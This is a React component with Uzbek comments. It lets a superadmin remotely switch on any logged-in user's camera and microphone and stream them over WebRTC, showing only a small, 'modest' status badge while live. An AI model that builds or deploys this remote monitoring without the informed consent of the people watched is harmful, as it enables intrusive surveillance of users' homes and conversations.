"use client";

import React, { useEffect, useRef, useState } from "react";
import { useTranslation } from "react-i18next";
import { auth } from "@/lib/api";
import { ICE_SERVERS, openRtcStream, rtcSignal, type RtcEvent } from "@/lib/rtc";

/**
 * Kuzatiluvchi tomon: tizimga kirgan har qanday foydalanuvchi brauzerida ishlaydi.
 * Superadmin kuzatishni so'raganda kamera+mikrofonni yoqib, oqimni to'g'ridan-to'g'ri (WebRTC) yuboradi.
 * Oqim ketayotganda ekranda doimiy "Kamera yoniq" belgisi ko'rinadi (yashirin emas).
 */
const LiveSource: React.FC = () => {
  const { t } = useTranslation();
  const [live, setLive] = useState(false);
  const streamRef = useRef<MediaStream | null>(null);
  const callsRef = useRef<Map<string, { pc: RTCPeerConnection; watcherId: string }>>(new Map());

  useEffect(() => {
    if (!auth.token) return;
    let closed = false;

    const ensureStream = async (): Promise<MediaStream | null> => {
      if (streamRef.current) return streamRef.current;
      try {
        const s = await navigator.mediaDevices.getUserMedia({
          video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 20, max: 30 }, facingMode: "user" },
          audio: { echoCancellation: true, noiseSuppression: true },
        });
        streamRef.current = s;
        return s;
      } catch {
        return null; // ruxsat berilmadi — kuzatib bo'lmaydi
      }
    };

    const refreshLive = () => setLive(callsRef.current.size > 0);

    const endCall = (callId: string) => {
      const c = callsRef.current.get(callId);
      if (c) {
        try {
          c.pc.close();
        } catch {
          /* ignore */
        }
        callsRef.current.delete(callId);
      }
      if (callsRef.current.size === 0 && streamRef.current) {
        streamRef.current.getTracks().forEach((tr) => tr.stop());
        streamRef.current = null;
      }
      refreshLive();
    };

    const startCall = async (callId: string, watcherId: string) => {
      const stream = await ensureStream();
      if (!stream || closed) return;
      const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
      callsRef.current.set(callId, { pc, watcherId });
      refreshLive();
      stream.getTracks().forEach((tr) => pc.addTrack(tr, stream));
      pc.onicecandidate = (e) => {
        if (e.candidate) void rtcSignal(watcherId, callId, "ice", e.candidate.toJSON());
      };
      pc.onconnectionstatechange = () => {
        if (["failed", "closed", "disconnected"].includes(pc.connectionState)) endCall(callId);
      };
      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);
      void rtcSignal(watcherId, callId, "offer", offer);
    };

    const onEvent = async (e: RtcEvent) => {
      if (closed) return;
      if (e.event === "watch-start") {
        await startCall(e.data.callId, e.data.watcherId);
      } else if (e.event === "watch-stop") {
        endCall(e.data.callId);
      } else if (e.event === "signal") {
        const c = callsRef.current.get(e.data.callId);
        if (!c) return;
        try {
          if (e.data.kind === "answer") await c.pc.setRemoteDescription(e.data.data as RTCSessionDescriptionInit);
          else if (e.data.kind === "ice") await c.pc.addIceCandidate(e.data.data as RTCIceCandidateInit);
        } catch {
          /* ignore */
        }
      } else if (e.event === "peer-gone") {
        // kuzatuvchi uzildi — o'sha calllarni yopamiz
        for (const [callId, c] of callsRef.current) if (c.watcherId === e.data.connId) endCall(callId);
      }
    };

    const stream = openRtcStream("source", (e) => void onEvent(e));

    return () => {
      closed = true;
      stream.close();
      for (const c of callsRef.current.values()) {
        try {
          c.pc.close();
        } catch {
          /* ignore */
        }
      }
      callsRef.current.clear();
      streamRef.current?.getTracks().forEach((tr) => tr.stop());
      streamRef.current = null;
    };
  }, []);

  if (!live) return null;
  // Kulrang, kamtarona belgi — chap pastki burchakda
  return (
    <div
      className="fixed bottom-3 left-3 z-[2147483000] inline-flex items-center gap-2 rounded-full border border-white/10 bg-slate-800/85 px-3 py-1.5 text-xs font-medium text-slate-200 shadow-lg backdrop-blur-sm"
      role="status"
    >
      <span className="relative flex h-2 w-2">
        <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-rose-400 opacity-70" />
        <span className="relative inline-flex h-2 w-2 rounded-full bg-rose-500" />
      </span>
      {t("live.camera_on")}
    </div>
  );
};

export default LiveSource;
